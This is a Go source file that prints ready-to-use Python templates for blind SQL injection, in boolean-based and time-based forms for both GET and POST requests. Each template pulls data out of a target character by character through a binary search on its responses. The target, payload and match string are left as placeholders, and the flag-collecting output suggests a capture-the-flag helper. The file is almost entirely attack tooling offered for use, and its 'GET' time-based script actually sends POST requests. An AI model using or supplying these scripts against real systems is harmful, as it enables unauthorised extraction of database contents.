package rcepay

import "fmt"

func shengming() {
	fmt.Println("\033[1;31;40m声明： 只提供最简单的注入脚本 打铁还需自身硬！\033[0m\n")
}
func shuchu(sql string) {
	fmt.Println(sql)
	shengming()
}

var boolget string = `
import requests
import sys

url = "xxxxxxx"  # 需要填入url
flag = ''
payload = "xxxxxxx"  # 填入payload
for i in range(1, 500):
    high = 128
    low = 32
    mid = (high + low) // 2
    while high > low:
        payload1 = payload.format(i, mid)
        res = requests.get(url + payload1)
        if 'xxxxx' in res.text:
            low = mid + 1
        else:
            high = mid
        mid = (low + high) // 2
    if chr(mid) == '':
        sys.exit()  # 退出程序
    flag += chr(mid)
    print(flag)

`
var boolpost string = `
import requests
import sys

url = "xxxxxxx"  # 需要填入url
flag = ''
payload = "xxxxxxx"  # 填入payload
for i in range(1, 500):
    high = 128
    low = 32
    mid = (high + low) // 2
    while high > low:
        payload1 = payload.format(i, mid)
        data = {
            'xxxx':payload1
        }
        res = requests.post(url=url,data=data)
        if 'xxxxx' in res.text:
            low = mid + 1
        else:
            high = mid
        mid = (low + high) // 2
    if chr(mid) == '':
        sys.exit()  # 退出程序
    flag += chr(mid)
    print(flag)
	`
var timepost string = `
import requests

url = 'xxxxxx'

payload = """xxxxx"""
flag =''
for i in range(1,100):
    high = 128
    low = 32
    mid = (high+low)//2
    while(high>low):
        payload1=  payload.format(i,mid)
        data = {
            'xxxxxx':payload1
        }
        try:
            re = requests.post(url=url,data=data,timeout=0.9)
            low = mid +1
        except Exception as e:
            high = mid
        mid =  (high+low)//2
    if low !=32:
        flag +=chr(mid)
        print(flag)
`
var timeget string = `
import requests

url = 'xxxxxx'

payload = """xxxxx"""
flag =''
for i in range(1,100):
    high = 128
    low = 32
    mid = (high+low)//2
    while(high>low):
        payload1=  payload.format(i,mid)
        try:
            re = requests.post(url=url+payload1,timeout=0.9)
            low = mid +1
        except Exception as e:
            high = mid
        mid =  (high+low)//2
    if low !=32:
        flag +=chr(mid)
        print(flag)
`

func Bool() {
	fmt.Println("\033[1;31;40mGET\033[0m")
	shuchu(boolget)
	fmt.Println("\033[1;31;40mPOST\033[0m")
	shuchu(boolpost)
}
func Time() {
	fmt.Println("\033[1;31;40mGET\033[0m")
	shuchu(timeget)
	fmt.Println("\033[1;31;40mPOST\033[0m")
	shuchu(timepost)

}
